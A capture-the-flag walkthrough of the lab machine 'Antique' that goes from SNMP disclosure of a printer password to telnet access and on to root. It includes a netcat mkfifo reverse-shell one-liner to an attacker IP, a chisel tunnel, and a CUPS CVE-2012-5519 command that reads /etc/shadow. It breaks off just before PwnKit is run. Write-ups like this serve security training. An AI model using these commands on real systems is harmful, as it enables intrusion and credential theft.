---------------
Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS administration service running locally. This service can be exploited further to gain root access on the server.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.107 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn -v
```

![](/assets/Antique/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **23/tcp**
+ **161/udp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS -sU 10.10.11.107 -p T:23,U:161 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Antique/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **23/tcp telnet**
+ **161/udp SNMPv1 server (public)**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS -sU 10.10.11.107 -p T:23,U:161 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

<br />

The scan reports nothing.

<br />

### Foothold

This machine is... weird. I'm used to exploting websites and then connecting via SSH. However this machine has neither of both. We are facing a Telnet server and an SNMP server. Anyway, this machine is not hard, we just have to do our research.

<br />

When trying to connect to **Telnet**, we are **asked for a password** but also we can see a banner that indicates us something about an ***HP JetDirect***:

```bash
telnet 10.10.11.107
```

![](/assets/Antique/3.png)
<br />
<br />
<br />

When trying to connect to **SNMP** using the ***public* community string**, we get this string:

```bash
snmpwalk -c "public" -v1 -t 10 10.10.11.107
```

![](/assets/Antique/4.png)
<br />
<br />
<br />

With this information I was completely lost, so I started to **search in Google** for this printer, the telnet and SNMP services. Until I found this website:

![](/assets/Antique/5.png)
<br />
<br />
<br />

In this website, we can find this section, which explains the way to get the **JetDirect's password**:

![](/assets/Antique/6.png)
<br />
<br />
<br />

Let's try it:

```bash
snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

![](/assets/Antique/7.png)
<br />
<br />
<br />

Great, let's now **copy the output and translate it from hexademical**, frmo which we can see a long string, however the first readable part is: ***P@ssw0rd@123!!123***:

![](/assets/Antique/8.png)
<br />
<br />
<br />

Let's try this password in Telnet:
<br />
![](/assets/Antique/9.png)
<br />
<br />
<br />

We can see that we have a **command to execute system commands**, so we can send us a **reverse shell**. I tried a few and only the ***nc mkfifo*** one worked:

```bash
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 4444 >/tmp/f
```

<br />
<br />
<br />

Now we only need to grab the **user flag**:

<br />
### Privilege Escalation

The privilege escalation of this machine **isn't intended to get command execution as root**, however I will still demonstrate how to get it.

<br />

After a bit of enumeration I discover that the **port 631/tcp** is open, so I'm going to download and use [**Chisel**](https://github.com/jpillora/chisel/releases/tag/v1.10.0) to set up local port forwarding, first we have to execute it on our machine:

```bash
chisel server --port 8080 --reverse
```

![](/assets/Antique/13.png)
<br />
<br />
<br />

Now we have to execute it on the pwned machine:

```bash
./chisel client 10.10.16.10:8080 1234:127.0.0.1:631 > /dev/null 2>&1 
```

![](/assets/Antique/14.png)
<br />
<br />
<br />

We can now connect to it and inspect it to get a **version number**:

![](/assets/Antique/15.png)
<br />
<br />
<br />

This version number leads us to **CVE-2012-5519**, which leads to this [GitHub project](https://github.com/p1ckzi/CVE-2012-5519/tree/main):

![](/assets/Antique/16.png)
<br />
<br />
<br />

Let's try what it says in the pwned machine:

```bash
cupsctl ErrorLog=/etc/shadow
curl 127.0.0.1:631/admin/log/error_log
```

![](/assets/Antique/17.png)
<br />
<br />
<br />

It worked perfectly, however **rockyou.txt doesn't contain the password**, we could get the root flag this way, but we want root command execution, so let's go for it.

<br />

Resuming our enumeration, we can see that ***pkexec*** has **SUID privileges**:

```bash
find / -perm -4000 -ls 2>/dev/null
```

![](/assets/Antique/18.png)
<br />
<br />
<br />

The only thing we have to do is transfer the **PwnKit** and run it:
